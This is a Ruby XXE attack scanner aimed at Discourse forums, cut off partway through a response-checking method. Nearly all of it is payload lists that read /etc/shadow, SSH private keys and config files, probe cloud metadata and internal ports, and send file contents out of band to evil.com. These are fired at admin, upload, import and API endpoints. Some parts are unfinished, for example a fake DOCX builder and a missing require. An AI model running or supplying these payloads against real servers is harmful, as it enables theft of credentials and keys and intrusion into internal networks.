#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'cgi'

class DiscourseXXE
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting XXE tests on #{@target_url}"
    puts "=" * 60
    
    # Basic XXE tests
    test_basic_xxe
    test_blind_xxe
    test_error_based_xxe
    
    # File disclosure XXE
    test_file_disclosure_xxe
    test_directory_listing_xxe
    test_sensitive_file_xxe
    
    # Network-based XXE
    test_ssrf_xxe
    test_port_scanning_xxe
    test_internal_network_xxe
    
    # Advanced XXE techniques
    test_parameter_entity_xxe
    test_utf16_xxe
    test_svg_xxe
    test_docx_xxe
    
    # Specific endpoint tests
    test_upload_xxe
    test_import_xxe
    test_export_xxe
    test_backup_xxe
    
    # Plugin-specific XXE
    test_plugin_xxe
    
    # Admin panel XXE
    test_admin_xxe
    
    # API endpoint XXE
    test_api_xxe
    
    print_results
    save_results
    
    @results
  end
  
  def test_basic_xxe
    puts "\n[*] Testing basic XXE..."
    @results[:summary][:total_tests] += 1
    
    # Basic XXE payloads
    basic_xxe_payloads = [
      # Simple file disclosure
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      
      # Windows file disclosure
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
      
      # PHP wrapper
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
      
      # HTTP request
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
      
      # FTP request
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/xxe">]><foo>&xxe;</foo>'
    ]
    
    # Test endpoints that might accept XML
    test_endpoints = [
      '/api/v1/posts',
      '/api/v1/topics',
      '/api/v1/users',
      '/admin/api',
      '/uploads',
      '/import',
      '/export',
      '/backup',
      '/admin/backups',
      '/admin/customize/themes/import'
    ]
    
    test_endpoints.each do |endpoint|
      basic_xxe_payloads.each do |payload|
        # Test POST request with XML content
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_xxe_success(response, payload)
          add_vulnerability({
            test_type: 'Basic XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: determine_xxe_severity(payload),
            evidence: extract_xxe_evidence(response.body, payload),
            description: "Basic XXE vulnerability in #{endpoint}"
          })
        end
        
        # Test POST request with form data containing XML
        response = test_xxe_form_post(endpoint, payload)
        
        if response && check_xxe_success(response, payload)
          add_vulnerability({
            test_type: 'Basic XXE (Form)',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/x-www-form-urlencoded',
            payload: payload,
            severity: determine_xxe_severity(payload),
            evidence: extract_xxe_evidence(response.body, payload),
            description: "XXE via form data in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_blind_xxe
    puts "\n[*] Testing blind XXE..."
    @results[:summary][:total_tests] += 1
    
    # Blind XXE payloads (out-of-band)
    blind_xxe_payloads = [
      # HTTP callback
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe?data=test">]><foo>&xxe;</foo>',
      
      # DNS callback
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe.evil.com">]><foo>&xxe;</foo>',
      
      # Parameter entity blind XXE
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>',
      
      # File exfiltration via HTTP
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%file;\'>">%eval;%exfil;]><foo>test</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import']
    
    test_endpoints.each do |endpoint|
      blind_xxe_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_blind_xxe_success(response)
          add_vulnerability({
            test_type: 'Blind XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: ['Blind XXE detected via response analysis'],
            description: "Blind XXE vulnerability in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_error_based_xxe
    puts "\n[*] Testing error-based XXE..."
    @results[:summary][:total_tests] += 1
    
    # Error-based XXE payloads
    error_xxe_payloads = [
      # Invalid file path to trigger error
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/file">]><foo>&xxe;</foo>',
      
      # Recursive entity to cause error
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe "&xxe;&xxe;&xxe;&xxe;&xxe;">]><foo>&xxe;</foo>',
      
      # Large entity expansion
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY a "' + 'A' * 10000 + '"><!ENTITY b "&a;&a;&a;&a;&a;">]><foo>&b;</foo>',
      
      # Invalid URL to trigger error
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://invalid-domain-xxe-test.com">]><foo>&xxe;</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import']
    
    test_endpoints.each do |endpoint|
      error_xxe_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_error_xxe_success(response)
          add_vulnerability({
            test_type: 'Error-based XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'Medium',
            evidence: extract_error_evidence(response.body),
            description: "Error-based XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_file_disclosure_xxe
    puts "\n[*] Testing file disclosure XXE..."
    @results[:summary][:total_tests] += 1
    
    # File disclosure payloads
    file_disclosure_payloads = [
      # Linux files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
      
      # Windows files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>',
      
      # Application files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config/database.yml">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config/secrets.yml">]><foo>&xxe;</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import', '/export']
    
    test_endpoints.each do |endpoint|
      file_disclosure_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_file_disclosure_success(response, payload)
          add_vulnerability({
            test_type: 'File Disclosure XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'Critical',
            evidence: extract_file_disclosure_evidence(response.body, payload),
            description: "File disclosure via XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_directory_listing_xxe
    puts "\n[*] Testing directory listing XXE..."
    @results[:summary][:total_tests] += 1
    
    # Directory listing payloads
    directory_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/">]><foo>&xxe;</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads']
    
    test_endpoints.each do |endpoint|
      directory_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_directory_listing_success(response)
          add_vulnerability({
            test_type: 'Directory Listing XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: ['Directory listing via XXE'],
            description: "Directory listing via XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_sensitive_file_xxe
    puts "\n[*] Testing sensitive file XXE..."
    @results[:summary][:total_tests] += 1
    
    # Sensitive file payloads
    sensitive_file_payloads = [
      # SSH keys
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/discourse/.ssh/id_rsa">]><foo>&xxe;</foo>',
      
      # Configuration files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><foo>&xxe;</foo>',
      
      # Database files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/lib/postgresql/data/postgresql.conf">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/redis/redis.conf">]><foo>&xxe;</foo>',
      
      # Log files
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/nginx/access.log">]><foo>&xxe;</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import']
    
    test_endpoints.each do |endpoint|
      sensitive_file_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_sensitive_file_success(response, payload)
          add_vulnerability({
            test_type: 'Sensitive File XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'Critical',
            evidence: extract_sensitive_file_evidence(response.body, payload),
            description: "Sensitive file access via XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_ssrf_xxe
    puts "\n[*] Testing SSRF XXE..."
    @results[:summary][:total_tests] += 1
    
    # SSRF XXE payloads
    ssrf_payloads = [
      # Internal network
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80">]><foo>&xxe;</foo>',
      
      # Cloud metadata
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
      
      # External callback
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe-callback">]><foo>&xxe;</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import']
    
    test_endpoints.each do |endpoint|
      ssrf_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_ssrf_xxe_success(response, payload)
          add_vulnerability({
            test_type: 'SSRF XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: extract_ssrf_evidence(response.body, payload),
            description: "SSRF via XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_port_scanning_xxe
    puts "\n[*] Testing port scanning XXE..."
    @results[:summary][:total_tests] += 1
    
    # Port scanning payloads
    common_ports = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
    
    common_ports.each do |port|
      payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:#{port}\">]><foo>&xxe;</foo>"
      
      response = test_xxe_post('/api/v1/posts', payload, 'application/xml')
      
      if response && check_port_scan_success(response, port)
        add_vulnerability({
          test_type: 'Port Scanning XXE',
          endpoint: '/api/v1/posts',
          method: 'POST',
          content_type: 'application/xml',
          payload: payload,
          severity: 'Medium',
          evidence: ["Port #{port} accessible via XXE"],
          description: "Port scanning via XXE - port #{port} open"
        })
      end
    end
  end
  
  def test_internal_network_xxe
    puts "\n[*] Testing internal network XXE..."
    @results[:summary][:total_tests] += 1
    
    # Internal network payloads
    internal_ips = ['192.168.1.1', '10.0.0.1', '172.16.0.1', '127.0.0.1']
    
    internal_ips.each do |ip|
      payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://#{ip}:80\">]><foo>&xxe;</foo>"
      
      response = test_xxe_post('/api/v1/posts', payload, 'application/xml')
      
      if response && check_internal_network_success(response, ip)
        add_vulnerability({
          test_type: 'Internal Network XXE',
          endpoint: '/api/v1/posts',
          method: 'POST',
          content_type: 'application/xml',
          payload: payload,
          severity: 'High',
          evidence: ["Internal IP #{ip} accessible via XXE"],
          description: "Internal network access via XXE - #{ip}"
        })
      end
    end
  end
  
  def test_parameter_entity_xxe
    puts "\n[*] Testing parameter entity XXE..."
    @results[:summary][:total_tests] += 1
    
    # Parameter entity payloads
    param_entity_payloads = [
      # Basic parameter entity
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
      
      # External DTD parameter entity
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>',
      
      # Nested parameter entity
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><foo>test</foo>'
    ]
    
    test_endpoints = ['/api/v1/posts', '/uploads', '/import']
    
    test_endpoints.each do |endpoint|
      param_entity_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_parameter_entity_success(response)
          add_vulnerability({
            test_type: 'Parameter Entity XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: ['Parameter entity XXE successful'],
            description: "Parameter entity XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_utf16_xxe
    puts "\n[*] Testing UTF-16 XXE..."
    @results[:summary][:total_tests] += 1
    
    # UTF-16 encoded XXE payload
    utf16_payload = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    utf16_encoded = utf16_payload.encode('UTF-16LE')
    
    test_endpoints = ['/api/v1/posts', '/uploads']
    
    test_endpoints.each do |endpoint|
      response = test_xxe_post_raw(endpoint, utf16_encoded, 'application/xml; charset=UTF-16')
      
      if response && check_utf16_xxe_success(response)
        add_vulnerability({
          test_type: 'UTF-16 XXE',
          endpoint: endpoint,
          method: 'POST',
          content_type: 'application/xml; charset=UTF-16',
          payload: utf16_payload,
          severity: 'High',
          evidence: ['UTF-16 XXE bypass successful'],
          description: "UTF-16 encoding XXE bypass in #{endpoint}"
        })
      end
    end
  end
  
  def test_svg_xxe
    puts "\n[*] Testing SVG XXE..."
    @results[:summary][:total_tests] += 1
    
    # SVG XXE payloads
    svg_xxe_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    ]
    
    test_endpoints = ['/uploads', '/users/avatar', '/admin/customize/themes/upload']
    
    test_endpoints.each do |endpoint|
      svg_xxe_payloads.each do |payload|
        response = test_svg_upload(endpoint, payload)
        
        if response && check_svg_xxe_success(response)
          add_vulnerability({
            test_type: 'SVG XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'multipart/form-data',
            payload: payload,
            severity: 'High',
            evidence: ['SVG XXE successful'],
            description: "SVG XXE in #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_docx_xxe
    puts "\n[*] Testing DOCX XXE..."
    @results[:summary][:total_tests] += 1
    
    # Create malicious DOCX with XXE
    docx_xxe_payload = create_malicious_docx
    
    test_endpoints = ['/uploads', '/admin/backups/upload']
    
    test_endpoints.each do |endpoint|
      response = test_docx_upload(endpoint, docx_xxe_payload)
      
      if response && check_docx_xxe_success(response)
        add_vulnerability({
          test_type: 'DOCX XXE',
          endpoint: endpoint,
          method: 'POST',
          content_type: 'multipart/form-data',
          payload: 'Malicious DOCX with XXE',
          severity: 'High',
          evidence: ['DOCX XXE successful'],
          description: "DOCX XXE in #{endpoint}"
        })
      end
    end
  end
  
  def test_upload_xxe
    puts "\n[*] Testing upload XXE..."
    @results[:summary][:total_tests] += 1
    
    # XML file upload with XXE
    xml_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><data>&xxe;</data>'
    ]
    
    xml_payloads.each do |payload|
      response = test_xml_file_upload(payload)
      
      if response && check_upload_xxe_success(response)
        add_vulnerability({
          test_type: 'Upload XXE',
          endpoint: '/uploads',
          method: 'POST',
          content_type: 'multipart/form-data',
          payload: payload,
          severity: 'High',
          evidence: ['XML file upload XXE successful'],
          description: "XXE via XML file upload"
        })
      end
    end
  end
  
  def test_import_xxe
    puts "\n[*] Testing import XXE..."
    @results[:summary][:total_tests] += 1
    
    # Import functionality XXE
    import_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE import [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><import><data>&xxe;</data></import>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE import [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><import><data>&xxe;</data></import>'
    ]
    
    import_endpoints = ['/import', '/admin/import', '/admin/customize/themes/import']
    
    import_endpoints.each do |endpoint|
      import_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_import_xxe_success(response)
          add_vulnerability({
            test_type: 'Import XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: ['Import XXE successful'],
            description: "XXE in import functionality: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_export_xxe
    puts "\n[*] Testing export XXE..."
    @results[:summary][:total_tests] += 1
    
    # Export functionality XXE
    export_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE export [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><export><data>&xxe;</data></export>'
    ]
    
    export_endpoints = ['/export', '/admin/export']
    
    export_endpoints.each do |endpoint|
      export_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_export_xxe_success(response)
          add_vulnerability({
            test_type: 'Export XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'High',
            evidence: ['Export XXE successful'],
            description: "XXE in export functionality: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_backup_xxe
    puts "\n[*] Testing backup XXE..."
    @results[:summary][:total_tests] += 1
    
    # Backup functionality XXE
    backup_payloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE backup [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><backup><data>&xxe;</data></backup>'
    ]
    
    backup_endpoints = ['/backup', '/admin/backups']
    
    backup_endpoints.each do |endpoint|
      backup_payloads.each do |payload|
        response = test_xxe_post(endpoint, payload, 'application/xml')
        
        if response && check_backup_xxe_success(response)
          add_vulnerability({
            test_type: 'Backup XXE',
            endpoint: endpoint,
            method: 'POST',
            content_type: 'application/xml',
            payload: payload,
            severity: 'Critical',
            evidence: ['Backup XXE successful'],
            description: "XXE in backup functionality: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_plugin_xxe
    puts "\n[*] Testing plugin XXE..."
    @results[:summary][:total_tests] += 1
    
    # Plugin-specific XXE
    plugin_tests = [
      { endpoint: '/chat/upload', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE chat [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><chat>&xxe;</chat>' },
      { endpoint: '/poll/import', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE poll [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><poll>&xxe;</poll>' },
      { endpoint: '/calendar/import', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE calendar [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><calendar>&xxe;</calendar>' }
    ]
    
    plugin_tests.each do |test|
      response = test_xxe_post(test[:endpoint], test[:payload], 'application/xml')
      
      if response && check_plugin_xxe_success(response)
        add_vulnerability({
          test_type: 'Plugin XXE',
          endpoint: test[:endpoint],
          method: 'POST',
          content_type: 'application/xml',
          payload: test[:payload],
          severity: 'High',
          evidence: ['Plugin XXE successful'],
          description: "XXE in plugin: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_admin_xxe
    puts "\n[*] Testing admin XXE..."
    @results[:summary][:total_tests] += 1
    
    # Admin panel XXE
    admin_tests = [
      { endpoint: '/admin/api', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE admin [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><admin>&xxe;</admin>' },
      { endpoint: '/admin/customize', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE customize [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><customize>&xxe;</customize>' },
      { endpoint: '/admin/logs', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE logs [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><logs>&xxe;</logs>' }
    ]
    
    admin_tests.each do |test|
      response = test_xxe_post(test[:endpoint], test[:payload], 'application/xml')
      
      if response && check_admin_xxe_success(response)
        add_vulnerability({
          test_type: 'Admin XXE',
          endpoint: test[:endpoint],
          method: 'POST',
          content_type: 'application/xml',
          payload: test[:payload],
          severity: 'Critical',
          evidence: ['Admin XXE successful'],
          description: "XXE in admin panel: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_api_xxe
    puts "\n[*] Testing API XXE..."
    @results[:summary][:total_tests] += 1
    
    # API endpoint XXE
    api_tests = [
      { endpoint: '/api/v1/posts', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE post [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><post>&xxe;</post>' },
      { endpoint: '/api/v1/topics', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE topic [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><topic>&xxe;</topic>' },
      { endpoint: '/api/v1/users', payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>' }
    ]
    
    api_tests.each do |test|
      response = test_xxe_post(test[:endpoint], test[:payload], 'application/xml')
      
      if response && check_api_xxe_success(response)
        add_vulnerability({
          test_type: 'API XXE',
          endpoint: test[:endpoint],
          method: 'POST',
          content_type: 'application/xml',
          payload: test[:payload],
          severity: 'High',
          evidence: ['API XXE successful'],
          description: "XXE in API: #{test[:endpoint]}"
        })
      end
    end
  end
  
  # Helper methods for testing
  def test_xxe_post(endpoint, payload, content_type)
    make_request(URI("#{@target_url}#{endpoint}"), 'POST', payload, {
      'Content-Type' => content_type
    })
  end
  
  def test_xxe_post_raw(endpoint, payload, content_type)
    make_request(URI("#{@target_url}#{endpoint}"), 'POST', payload, {
      'Content-Type' => content_type
    })
  end
  
  def test_xxe_form_post(endpoint, xml_payload)
    data = {
      'xml' => xml_payload,
      'data' => xml_payload,
      'content' => xml_payload
    }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  def test_svg_upload(endpoint, svg_payload)
    # Simulate SVG file upload
    boundary = "----WebKitFormBoundary#{SecureRandom.hex(16)}"
    body = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"test.svg\"\r\n"
    body += "Content-Type: image/svg+xml\r\n\r\n"
    body += svg_payload
    body += "\r\n--#{boundary}--\r\n"
    
    make_request(URI("#{@target_url}#{endpoint}"), 'POST', body, {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}"
    })
  end
  
  def test_xml_file_upload(xml_payload)
    # Simulate XML file upload
    boundary = "----WebKitFormBoundary#{SecureRandom.hex(16)}"
    body = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"test.xml\"\r\n"
    body += "Content-Type: application/xml\r\n\r\n"
    body += xml_payload
    body += "\r\n--#{boundary}--\r\n"
    
    make_request(URI("#{@target_url}/uploads"), 'POST', body, {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}"
    })
  end
  
  def test_docx_upload(endpoint, docx_data)
    # Simulate DOCX file upload
    boundary = "----WebKitFormBoundary#{SecureRandom.hex(16)}"
    body = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"test.docx\"\r\n"
    body += "Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\n"
    body += docx_data
    body += "\r\n--#{boundary}--\r\n"
    
    make_request(URI("#{@target_url}#{endpoint}"), 'POST', body, {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}"
    })
  end
  
  def create_malicious_docx
    # Create a simple malicious DOCX structure with XXE
    xxe_content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><document>&xxe;</document>'
    
    # This is a simplified representation - in reality, you'd need to create a proper ZIP structure
    xxe_content
  end
  
  # Helper methods for checking success
  def check_xxe_success(response, payload)
    return false unless response && response.code.to_i < 500
    
    # Check for file content disclosure
    if payload.include?('file:///etc/passwd')
      return response.body.match(/root:.*:0:0:/) || response.body.include?('root:x:0:0:')
    elsif payload.include?('file:///C:/windows/win.ini')
      return response.body.include?('[fonts]') || response.body.include?('[extensions]')
    elsif payload.include?('http://')
      return check_http_xxe_success(response)
    end
    
    # Check for general XXE indicators
    response.body.length > 0 && !response.body.include?('XML parsing error')
  end
  
  def check_blind_xxe_success(response)
    return false unless response
    
    # Check for timing differences or response size changes
    response.code.to_i < 500 && response.body.length > 0
  end
  
  def check_error_xxe_success(response)
    return false unless response
    
    # Check for XML parsing errors that might reveal XXE processing
    error_indicators = [
      'XML parsing error',
      'External entity',
      'DOCTYPE',
      'Entity',
      'XML parser',
      'libxml',
      'SAXParseException'
    ]
    
    error_indicators.any? { |indicator| response.body.include?(indicator) }
  end
  
  def check_file_disclosure_success(response, payload)
    return false unless response && response.code.to_i < 500
    
    if payload.include?('/etc/passwd')
      response.body.match(/root:.*:0:0:/)
    elsif payload.include?('/etc/shadow')
      response.body.include?('root:$') || response.body.include?('root:!')
    elsif payload.include?('/etc/hosts')
